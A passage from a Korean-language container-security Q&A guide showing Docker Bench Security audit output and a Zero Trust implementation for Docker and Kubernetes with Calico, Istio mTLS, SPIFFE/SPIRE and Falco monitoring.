  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /etc:/etc \
  --label docker_bench_security \
  docker/docker-bench-security

# 출력 예시:
[INFO] 1 - Host Configuration
[PASS] 1.1.1 - Ensure a separate partition for containers
[WARN] 1.2.1 - Ensure the container host has been Hardened
[INFO] 2 - Docker daemon configuration
[PASS] 2.1 - Restrict network traffic between containers
[FAIL] 2.8 - Enable user namespace support
...
```

**점수 집계**:
```
총 권장사항: 104개
  PASS: 67
  WARN: 21
  FAIL: 16

점수: 64.4% (70% 이상 권장)
```

**자주 실패하는 항목과 해결**:

| 항목 | 이유 | 해결 |
|------|------|------|
| 1.2.1 Rootless Docker | 복잡도 | Rootless 마이그레이션 |
| 2.8 User Namespace | 기능 미사용 | `userns-remap` 활성화 |
| 4.1 신뢰된 이미지 | 내부 빌드 이미지 | Private Registry + DCT |
| 5.4 특권 컨테이너 | 레거시 앱 | Capabilities로 대체 |
| 5.12 Read-only 루트 | 로그 쓰기 | tmpfs 또는 Volume 사용 |

### 실무 적용
CI/CD 파이프라인에 Docker Bench Security를 통합하여 매 배포 시 검사한다. 규정 준수가 필요한 조직은 최소 80% PASS를 목표로 한다. 일부 항목(Rootless, User Namespace)은 점진적으로 적용하고, 특권 컨테이너나 호스트 네트워크 사용은 엄격히 제한한다.

---

## Q7. Zero Trust 네트워크 모델을 Docker 환경에서 어떻게 구현하는가?

### 왜 이 질문이 중요한가
전통적인 방화벽 모델은 "내부는 신뢰"한다. 하지만 내부망이 침투당하면 전체가 무너진다. Zero Trust는 "아무것도 신뢰하지 않고 모두 검증"하여 횡적 이동을 차단한다.

### 답변
**Zero Trust 원칙**:

```
전통적 모델 (성과 해자):
  ┌────────────────────────────────────┐
  │          Perimeter Firewall        │
  │  ┌──────────────────────────────┐  │
  │  │      Trusted Internal Zone   │  │
  │  │  ┌──┐ ┌──┐ ┌──┐ ┌──┐ ┌──┐   │  │
  │  │  │  │←│  │←│  │←│  │←│  │   │  │
  │  │  └──┘ └──┘ └──┘ └──┘ └──┘   │  │
  │  │   모든 내부 서비스 서로 신뢰   │  │
  │  └──────────────────────────────┘  │
  └────────────────────────────────────┘
  문제: 하나만 뚫리면 전체 장악

Zero Trust 모델:
  ┌────────────────────────────────────┐
  │   모든 연결이 인증/암호화/검증됨    │
  │  ┌──┐     ┌──┐     ┌──┐     ┌──┐  │
  │  │A │────►│B │  ✗  │C │────►│D │  │
  │  └──┘ mTLS└──┘     └──┘ mTLS└──┘  │
  │   ▲        │         ▲        │    │
  │   └────────┘         └────────┘    │
  │  각 연결마다 인증서 검증, 정책 확인  │
  └────────────────────────────────────┘
```

**Docker/Kubernetes에서 Zero Trust 구현**:

**1. 네트워크 격리 (Micro-segmentation)**:
```yaml
# Calico NetworkPolicy (Kubernetes)
apiVersion: projectcalico.org/v3
kind: NetworkPolicy
metadata:
  name: frontend-policy
spec:
  selector: app == 'frontend'
  ingress:
    - action: Allow
      source:
        selector: app == 'nginx-ingress'
  egress:
    - action: Allow
      destination:
        selector: app == 'api'
    - action: Deny  # 기본 거부
```

**2. mTLS (상호 TLS 인증)**:

**Istio 예시**:
```yaml
# 모든 서비스 간 mTLS 강제
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT  # mTLS 없으면 연결 차단
```

**작동 원리**:
```
Service A → Service B 호출 흐름:

1. A의 Envoy Sidecar → A의 인증서로 TLS 시작
2. B의 Envoy Sidecar → B의 인증서 제시
3. 양측 인증서 검증 (Istio CA 서명 확인)
4. 암호화된 채널로 데이터 전송
5. B의 RBAC 정책 확인 (A가 호출 허용된 서비스인가?)
6. 정책 통과 → 요청 처리
```

**3. 서비스 ID 기반 인증 (SPIFFE/SPIRE)**:
```yaml
# SPIRE Agent가 컨테이너에 ID 발급
# X.509 인증서를 /run/spire/sockets/agent.sock에 제공

# 애플리케이션 코드
import grpc
from spiffe import WorkloadApiClient

# SPIRE에서 인증서 가져오기
client = WorkloadApiClient()
svid = client.fetch_x509_svid()

# mTLS로 다른 서비스 호출
channel = grpc.secure_channel(
    'service-b:8080',
    grpc.ssl_channel_credentials(svid.cert, svid.key)
)
```

**4. 최소 권한 정책 (RBAC)**:
```yaml
# Istio AuthorizationPolicy
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: api-authz
spec:
  selector:
    matchLabels:
      app: api
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/default/sa/frontend"]
    to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/v1/*"]
```

**5. 감사 로깅**:
```yaml
# Istio Telemetry
apiVersion: telemetry.istio.io/v1alpha1
kind: Telemetry
metadata:
  name: mesh-logging
spec:
  accessLogging:
    - providers:
      - name: envoy
```

**로그 예시**:
```json
{
  "source": "frontend-7d4f8c-abc",
  "destination": "api-6b9a2d-def",
  "method": "POST",
  "path": "/api/users",
  "response_code": 200,
  "mtls": true,
  "principal": "cluster.local/ns/default/sa/frontend"
}
```

**6. 런타임 보안 모니터링 (Falco 통합)**:
```yaml
# 의심스러운 활동 탐지
- rule: Service-to-service without mTLS
  condition: >
    inbound and
    not connection.tls_version
  output: >
    Unencrypted connection detected
    (source=%connection.source dest=%connection.dest)
  priority: CRITICAL
```

**Zero Trust 체크리스트**:

```
□ 네트워크 정책으로 기본 거부, 허용 목록만 통과
□ 모든 서비스 간 mTLS 강제
□ 인증서 기반 서비스 ID (SPIFFE)
□ RBAC로 최소 권한 정책
□ 모든 요청 로깅 및 감사
□ 런타임 이상 탐지 (Falco)
□ 정기적인 인증서 로테이션 (자동)
□ 침투 테스트로 횡적 이동 검증
```

**구현 로드맵**:

**Phase 1: 가시성**
- 서비스 간 통신 맵 생성 (Istio Kiali)
- 트래픽 로깅 활성화

**Phase 2: 암호화**
- mTLS Permissive 모드 (옵션)
- 점진적으로 서비스 전환
- mTLS Strict 모드 (강제)

**Phase 3: 인가**
- NetworkPolicy 적용
- RBAC 정책 작성
- 기본 거부 정책

**Phase 4: 모니터링**
- Falco 배포
- 알림 통합 (Slack, PagerDuty)
- 대응 플레이북 작성

### 실무 적용
Kubernetes 환경에서는 Istio나 Linkerd 같은 Service Mesh를 사용하여 Zero Trust를 구현한다. 초기에는 Permissive 모드로 시작하여 트래픽 패턴을 학습하고, 점진적으로 Strict 모드로 전환한다. 마이크로서비스가 10개 미만이면 NetworkPolicy만으로도 충분하지만, 수십 개 이상이면 Service Mesh의 자동화된 mTLS와 정책 관리가 필수적이다.
